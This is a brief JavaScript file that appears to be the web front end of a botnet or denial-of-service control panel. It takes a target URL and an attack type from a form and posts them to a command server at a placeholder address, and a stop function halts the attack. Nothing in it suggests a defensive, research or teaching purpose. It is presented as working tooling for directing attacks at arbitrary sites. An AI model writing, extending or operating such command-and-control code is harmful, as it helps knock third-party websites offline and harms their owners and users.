document.getElementById('attackForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const targetURL = document.getElementById('targetURL').value;
    const attackType = document.getElementById('attackType').value;

    fetch('http://<command_server_ip>:3000/start', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ targetURL, attackType })
    }).then(response => response.text())
      .then(data => {
        alert(data);
      });
});

function stopAttack() {
    fetch('http://<command_server_ip>:3000/stop', {
        method: 'POST'
    }).then(response => response.text())
      .then(data => {
        alert(data);
      });
}
